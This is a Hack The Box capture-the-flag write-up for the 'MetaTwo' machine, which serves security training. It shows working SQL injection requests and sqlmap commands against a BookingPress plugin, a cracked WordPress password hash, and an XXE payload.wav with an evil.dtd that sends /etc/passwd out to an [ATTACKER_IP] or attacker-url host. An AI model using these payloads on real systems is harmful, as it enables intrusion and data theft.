---
title: 'MetaTwo'
date: '2026-09-09'
excerpt: 'Easy - Linux (CJCA Track)'
prog: 'Hack The Box Machines - September 2026'
type: 'machines'
---

<div class="writeup-header">
<div class="writeup-header-text">
<div class="writeup-org">Hack The Box</div>
<h1 class="writeup-title">MetaTwo</h1>
<div class="writeup-date">September 2026 &middot; Machines</div>
</div>
</div>
<p class="lead mb-4"> </p>

<h4 class="mb-3">Tasks</h4>
<p class="mb-2"><strong>Question 1:</strong> How many TCP ports are open on the remote host?</p>
<p class="mb-3">Run <code>nmap -sC -sV -A [TARGET_IP]</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ nmap -sC -sV -A 10.129.228.95
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-08 20:44 EDT
Nmap scan report for 10.129.228.95
Host is up (0.18s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp?
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 264.77 seconds
```

<p class="mb-5"><strong>Answer:</strong> 3</p>
<br />


<p class="mb-2"><strong>Question 2:</strong> Which CMS and version is the website using?</p>
<p class="mb-3">Open the target IP address in the web browser and navigate to Network Tab in the DevTools. Reload the page and check the CMS type and version number.</p>
<p class="mb-5"><strong>Answer:</strong> Wordpress 5.6.2</p>
<br />


<p class="mb-2"><strong>Question 3:</strong> Which PHP version is the website using?</p>
<p class="mb-3">Read the HTTP response for the HTML file in the Network tab of DevTools.</p>

```txt
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Tue, 08 Sep 2026 00:55:55 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.24
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Link: <http://metapress.htb/wp-json/>; rel="https://api.w.org/"
Content-Encoding: gzip
```

<p class="mb-5"><strong>Answer:</strong> 8.0.24</p>
<br />


<p class="mb-2"><strong>Question 4:</strong> Which CVE is the bookingpress plugin being used on the website vulnerable to?</p>
<p class="mb-3">We run a WPScan using <code>wpscan --enumerate ap --url http://metapress.htb/</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ wpscan --enumerate ap --url http://metapress.htb/
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://metapress.htb/ [10.129.228.95]
[+] Started: Tue Sep  8 20:56:56 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: nginx/1.18.0
 |  - X-Powered-By: PHP/8.0.24
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://metapress.htb/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://metapress.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://metapress.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://metapress.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).
 | Found By: Rss Generator (Passive Detection)
 |  - http://metapress.htb/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>
 |  - http://metapress.htb/comments/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://metapress.htb/wp-content/themes/twentytwentyone/
 | Last Updated: 2026-05-20T00:00:00.000Z
 | Readme: http://metapress.htb/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 2.8
 | Style URL: http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Sep  8 20:57:06 2026
[+] Requests Done: 31
[+] Cached Requests: 7
[+] Data Sent: 8.774 KB
[+] Data Received: 215.646 KB
[+] Memory used: 257.934 MB
[+] Elapsed time: 00:00:10
```

<p class="mb-3">However, the WPScan surprisingly did not detect any plugins. So we need to manually check for it by exploring the web page. We see a link to <code>http://metapress.htb/hello-world/</code> which when opened, has another link to <code>http://metapress.htb/events/</code>. Viewing the page source code by pressing Ctrl+U on the keyboard reveals some information about the bookingpress plugin used.</p>

```HTML
[...]
<link rel='stylesheet' id='bookingpress_tel_input-css'  href='http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_tel_input.css?ver=1.0.10' media='all' />
<link rel='stylesheet' id='bookingpress_calendar_css-css'  href='http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_vue_calendar.css?ver=1.0.10' media='all' />
[...]
```

<p class="mb-3">Searching for the CVE for bookingpress v1.0.10 shows that it is vulnerable to Unauthenticated SQL Injection, and the CVE assigned was CVE-2022-0739.</p>

<p class="mb-5"><strong>Answer:</strong> CVE-2022-0739</p>
<br />


<p class="mb-2"><strong>Question 5:</strong> Which database table contains the password hash for the Wordpress users?</p>
<p class="mb-3">The following is the PoC from <a href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357/" target="_blank" rel="noopener norefer">BookingPress &lt; 1.0.11 - Unauthenticated SQL Injection on WPScan</a>:</p>

```txt
- Create a new "category" and associate it with a new "service" via the BookingPress admin menu (/wp-admin/admin.php?page=bookingpress_services)
- Create a new page with the "[bookingpress_form]" shortcode embedded (the "BookingPress Step-by-step Wizard Form")
- Visit the just created page as an unauthenticated user and extract the "nonce" (view source -> search for "action:'bookingpress_front_get_category_services'")
- Invoke the following curl command

curl -i 'https://example.com/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=8cc8b79544&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'

Time based payload:  curl -i 'https://example.com/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=8cc8b79544&category_id=1&total_service=1) AND (SELECT 9578 FROM (SELECT(SLEEP(5)))iyUp)-- ZmjH'
```

<p class="mb-3">First we need to find the <code>_wpnonce</code> value as required by the vulnerability PoC. We can use Ctrl+F to search for 'wpnonce' in the <code>http://metapress.htb/events/</code> page source code.</p>

```JavaScript
generateSpamCaptcha(){
    const vm = this;
    var postData = { action:'bookingpress_generate_spam_captcha', _wpnonce:'beca857f51' };
        axios.post( appoint_ajax_obj.ajax_url, Qs.stringify( postData ) )
    .then( function (response) {
        if(response.variant != 'error' && (response.data.captcha_val != '' && response.data.captcha_val != undefined)){
            vm.appointment_step_form_data.spam_captcha = response.data.captcha_val
        }else{
```

<p class="mb-3">Now we use cURL command to verify the SQL injection with the <code>_wpnonce</code> value in place.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=beca857f51&category_id=123&total_service=111) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Tue, 08 Sep 2026 01:24:54 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.24
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin

[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
```

<p class="mb-3">The response received proves that SQL injection is successful. We now use the <code>sqlmap</code> tool, which helps us automate detection and exploitation of SQL injection. First we view which databases are present.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --method POST --data "action=bookingpress_front_get_category_services&_wpnonce=beca857f51&category_id=123&total_service=111" -p total_service --level=5 --risk=3 --dbs
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.6#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:24:19 /2026-09-08/

[21:24:19] [INFO] testing connection to the target URL
[21:24:20] [INFO] checking if the target is protected by some kind of WAF/IPS
[21:24:20] [INFO] testing if the target URL content is stable
[21:24:20] [INFO] target URL content is stable
[21:24:21] [WARNING] heuristic (basic) test shows that POST parameter 'total_service' might not be injectable
[21:24:21] [INFO] testing for SQL injection on POST parameter 'total_service'
[21:24:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:24:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[21:24:34] [INFO] POST parameter 'total_service' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable 
[21:24:38] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[21:24:43] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[21:24:44] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[21:24:44] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[21:24:44] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[21:24:44] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[21:24:44] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[21:24:45] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[21:24:45] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[21:24:45] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[21:24:45] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[21:24:45] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[21:24:46] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[21:24:46] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[21:24:46] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[21:24:46] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[21:24:46] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[21:24:47] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[21:24:47] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[21:24:48] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[21:24:48] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[21:24:48] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[21:24:48] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[21:24:48] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[21:24:48] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[21:24:48] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[21:24:48] [INFO] testing 'Generic inline queries'
[21:24:48] [INFO] testing 'MySQL inline queries'
[21:24:49] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[21:24:49] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[21:24:49] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[21:24:49] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[21:24:49] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[21:24:50] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[21:24:50] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[21:25:00] [INFO] POST parameter 'total_service' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[21:25:00] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[21:25:00] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[21:25:05] [INFO] target URL appears to be UNION injectable with 9 columns
[21:25:05] [INFO] POST parameter 'total_service' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
[21:25:05] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'total_service' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Y
sqlmap identified the following injection point(s) with a total of 132 HTTP(s) requests:
---
Parameter: total_service (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: action=bookingpress_front_get_category_services&_wpnonce=beca857f51&category_id=123&total_service=-4959) OR 4012=4012-- IBfs

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=bookingpress_front_get_category_services&_wpnonce=beca857f51&category_id=123&total_service=111) AND (SELECT 8837 FROM (SELECT(SLEEP(5)))xpRp)-- Ywac

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: action=bookingpress_front_get_category_services&_wpnonce=beca857f51&category_id=123&total_service=111) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a767071,0x6c6373745854546e79467569437966614251786a774f74574b665269486f456f50506b56744a7361,0x7162627171),NULL-- -
---
[21:25:09] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0, PHP 8.0.24
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[21:25:09] [INFO] fetching database names
available databases [2]:
[*] blog
[*] information_schema

[21:25:10] [INFO] fetched data logged to text files under '/home/aaronamran/.local/share/sqlmap/output/metapress.htb'
[21:25:10] [WARNING] your sqlmap version is outdated

[*] ending @ 21:25:09 /2026-09-08/
```

<p class="mb-3">There are 2 listed databases: <code>blog</code> and <code>information_schema</code>. We enumerate the <code>blog</code> database and list the tables in it.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --method POST --data "action=bookingpress_front_get_category_services&_wpnonce=beca857f51&category_id=123&total_service=111" -p total_service --level=5 --risk=3 -D blog --tables
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.6#stable}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:26:57 /2026-09-08/

[21:26:58] [INFO] resuming back-end DBMS 'mysql' 
[21:26:58] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: total_service (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: action=bookingpress_front_get_category_services&_wpnonce=beca857f51&category_id=123&total_service=-4959) OR 4012=4012-- IBfs

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=bookingpress_front_get_category_services&_wpnonce=beca857f51&category_id=123&total_service=111) AND (SELECT 8837 FROM (SELECT(SLEEP(5)))xpRp)-- Ywac

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: action=bookingpress_front_get_category_services&_wpnonce=beca857f51&category_id=123&total_service=111) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a767071,0x6c6373745854546e79467569437966614251786a774f74574b665269486f456f50506b56744a7361,0x7162627171),NULL-- -
---
[21:26:58] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0, PHP 8.0.24
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[21:26:58] [INFO] fetching tables for database: 'blog'
Database: blog
[27 tables]
+--------------------------------------+
| wp_bookingpress_appointment_bookings |
| wp_bookingpress_categories           |
| wp_bookingpress_customers            |
| wp_bookingpress_customers_meta       |
| wp_bookingpress_customize_settings   |
| wp_bookingpress_debug_payment_log    |
| wp_bookingpress_default_daysoff      |
| wp_bookingpress_default_workhours    |
| wp_bookingpress_entries              |
| wp_bookingpress_form_fields          |
| wp_bookingpress_notifications        |
| wp_bookingpress_payment_logs         |
| wp_bookingpress_services             |
| wp_bookingpress_servicesmeta         |
| wp_bookingpress_settings             |
| wp_commentmeta                       |
| wp_comments                          |
| wp_links                             |
| wp_options                           |
| wp_postmeta                          |
| wp_posts                             |
| wp_term_relationships                |
| wp_term_taxonomy                     |
| wp_termmeta                          |
| wp_terms                             |
| wp_usermeta                          |
| wp_users                             |
+--------------------------------------+

[21:26:58] [INFO] fetched data logged to text files under '/home/aaronamran/.local/share/sqlmap/output/metapress.htb'
[21:26:58] [WARNING] your sqlmap version is outdated

[*] ending @ 21:26:58 /2026-09-08/
```

<p class="mb-3">We can see the <code>wp_users</code> table being listed. Next we have to dump the contents of this table.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --method POST --data "action=bookingpress_front_get_category_services&_wpnonce=beca857f51&category_id=123&total_service=111" -p total_service --level=5 --risk=3 -D blog -T wp_users --dump
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.6#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:37:40 /2026-09-08/

[21:37:41] [INFO] resuming back-end DBMS 'mysql' 
[21:37:41] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: total_service (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: action=bookingpress_front_get_category_services&_wpnonce=beca857f51&category_id=123&total_service=-4959) OR 4012=4012-- IBfs

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=bookingpress_front_get_category_services&_wpnonce=beca857f51&category_id=123&total_service=111) AND (SELECT 8837 FROM (SELECT(SLEEP(5)))xpRp)-- Ywac

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: action=bookingpress_front_get_category_services&_wpnonce=beca857f51&category_id=123&total_service=111) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a767071,0x6c6373745854546e79467569437966614251786a774f74574b665269486f456f50506b56744a7361,0x7162627171),NULL-- -
---
[21:37:41] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.0.24, Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[21:37:41] [INFO] fetching columns for table 'wp_users' in database 'blog'
[21:37:41] [INFO] fetching entries for table 'wp_users' in database 'blog'
[21:37:41] [INFO] recognized possible password hashes in column 'user_pass'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[21:37:45] [INFO] writing hashes to a temporary file '/tmp/sqlmapye5djenn124291/sqlmaphashes-srg85bct.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[21:37:48] [INFO] using hash method 'phpass_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/smalldict.txt' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 

[21:37:49] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] n
[21:37:51] [INFO] starting dictionary-based cracking (phpass_passwd)
[21:37:51] [INFO] starting 4 processes 
[21:38:13] [WARNING] no clear password(s) found                                                                                                       
Database: blog
Table: wp_users
[2 entries]
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| ID | user_url             | user_pass                          | user_email            | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| 1  | http://metapress.htb | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb   | admin      | 0           | admin        | admin         | 2022-06-23 17:58:28 | <blank>             |
| 2  | <blank>              | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager    | 0           | manager      | manager       | 2022-06-23 18:07:55 | <blank>             |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+

[21:38:13] [INFO] table 'blog.wp_users' dumped to CSV file '/home/aaronamran/.local/share/sqlmap/output/metapress.htb/dump/blog/wp_users.csv'
[21:38:13] [INFO] fetched data logged to text files under '/home/aaronamran/.local/share/sqlmap/output/metapress.htb'
[21:38:13] [WARNING] your sqlmap version is outdated

[*] ending @ 21:38:13 /2026-09-08/
```

<p class="mb-5"><strong>Answer:</strong> wp_users</p>
<br />


<p class="mb-2"><strong>Question 6:</strong> What is the password for the Wordpress user manager?</p>
<p class="mb-3">The output of the table dump contains the password hash for the users <code>admin</code> and <code>manager</code>. We store the hashes in a file.</p>

```txt
admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
```

<p class="mb-3">In the <code>/usr/share/wordlists</code> directory, it is important that we use <code>sudo gunzip rockyou.txt.gz</code> first so we can use <code>rockyou.txt</code> as the wordlist. Then we run <code>john --wordlist=/usr/share/wordlists/rockyou.txt wp_users.hash</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[/usr/share/wordlists]
└──╼ [★]$ sudo gunzip rockyou.txt.gz 
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[/usr/share/wordlists]
└──╼ [★]$ ls
brutespray  dirbuster   fasttrack.txt  john.lst    nmap.lst     seclists    wfuzz
dirb        dnsmap.txt  fern-wifi      metasploit  rockyou.txt  sqlmap.txt  wifite.txt
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[/usr/share/wordlists]
└──╼ [★]$ cd
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ john --wordlist=/usr/share/wordlists/rockyou.txt wp_users.hash
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
partylikearockstar (manager)     
1g 0:00:02:39 64.54% (ETA: 21:50:48) 0.006287g/s 58329p/s 59024c/s 59024C/s carrin21idolaku..carrie2679
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session aborted
```

<p class="mb-3">We cracked the password for the user <code>manager</code>, which happens to be <code>partylikearockstar</code>. Now we login with the credentials at <code>http://metapress.htb/wp-login.php</code>.</p>

![MetaTwo1](/images/metatwo_hackthebox_image1.png)

<p class="mb-3">A successful login reveals the Wordpress admin dashboard.</p> 
<p class="mb-5"><strong>Answer:</strong> partylikearockstar</p>
<br />


<p class="mb-2"><strong>Question 7:</strong> Which CVE is the Media library of this Wordpress version vulnerable to?</p>
<p class="mb-3">The information we have so far is that the Wordpress version is 5.6.2, PHP version used is 8.0.24. This <a href="https://wpscan.com/wordpress/562/" target="_blank" rel="noopener noreferer">link</a> contains a list of vulnerabilites for Wordpress v5.6.2. Scrolling down the list, we discover that the vulnerability titled '<a href="https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5/" target="_blank" rel="noopener noreferer">WordPress 5.6-5.7 - Authenticated XXE Within the Media Library Affecting PHP 8</a>' could be used.</p> 
<p class="mb-5"><strong>Answer:</strong> CVE-2021-29447</p>
<br />


<p class="mb-2"><strong>Question 8:</strong> What is the FTP password for the user metapress.htb?</p>
<p class="mb-3">The PoC for the CVE-2021-29447 vulnerability is shown below:</p>

```XML
payload.wav:

RIFFXXXXWAVEBBBBiXML<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://attacker-url.domain/xxe.dtd">
%sp;
%param1;
]>
<r>&exfil;</r>>

xxe.dtd:

<!ENTITY % data SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=../wp-config.php">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker-url.domain/?%data;'>">
```

<p class="mb-3">Notice how we need two files: <code>payload.wav</code> and <code>evil.dtd</code>. We first create <code>payload.wav</code> with the following payload, which triggers the download of the <code>evil.dtd</code> file on the remote host.</p>

```Console
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://[ATTACKER_IP]:8080/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

<p class="mb-3">Now we create <code>evil.dtd</code> with the following payload which when parsed by the remote host, triggers it to send the base64 encoded data of the <code>/ect/passwd</code> file to our local HTTP server.</p>

```XML
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://[ATTACKER_IP]:8080/?p=%file;'>" >
```

![MetaTwo2](/images/metatwo_hackthebox_image2.png)

